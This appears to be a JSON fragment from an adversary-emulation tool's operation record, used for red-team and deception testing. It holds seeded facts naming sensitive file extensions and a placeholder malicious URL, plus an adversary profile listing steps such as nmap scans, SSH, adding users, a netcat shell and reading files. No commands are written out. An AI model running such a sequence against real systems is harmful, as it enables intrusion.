"ed32b9c3-9593-4c33-b0db-e2007315096b", "plugin": "stockpile", "facts": [{"trait": "file.sensitive.extension", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "wav", "unique": "file.sensitive.extensionwav", "created": "2023-10-03T20:12:55Z", "relationships": []}, {"trait": "file.sensitive.extension", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "yml", "unique": "file.sensitive.extensionyml", "created": "2023-10-03T20:12:55Z", "relationships": []}, {"trait": "file.sensitive.extension", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "png", "unique": "file.sensitive.extensionpng", "created": "2023-10-03T20:12:55Z", "relationships": []}, {"trait": "server.malicious.url", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "server.malicious.url", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "keyloggedsite.com", "unique": "server.malicious.urlkeyloggedsite.com", "created": "2023-10-03T20:12:55Z", "relationships": []}], "relationships": []}, "obfuscator": "plain-text", "objective": {"percentage": 0.0, "goals": [{"achieved": false, "target": "exhaustion", "operator": "==", "value": "complete", "count": 1048576}], "name": "default", "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc", "description": "This is a default objective that runs forever."}, "visibility": 50, "adversary": {"atomic_ordering": ["deception-nmap", "deception-nmapsubnet", "deception-ssh", "deception-user-add", "deception-user-run-agent", "deception-ncshell", "deception-vsftpd", "deception-whoami", "deception-ls", "deception-pwd", "deception-readfile"], "name": "Deception Enterprise", "plugin": "deception", "description": "This is simple", "adversary_id": "deception_enterprise", "tags": [], "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc", "has_repeatable_abilities": false}}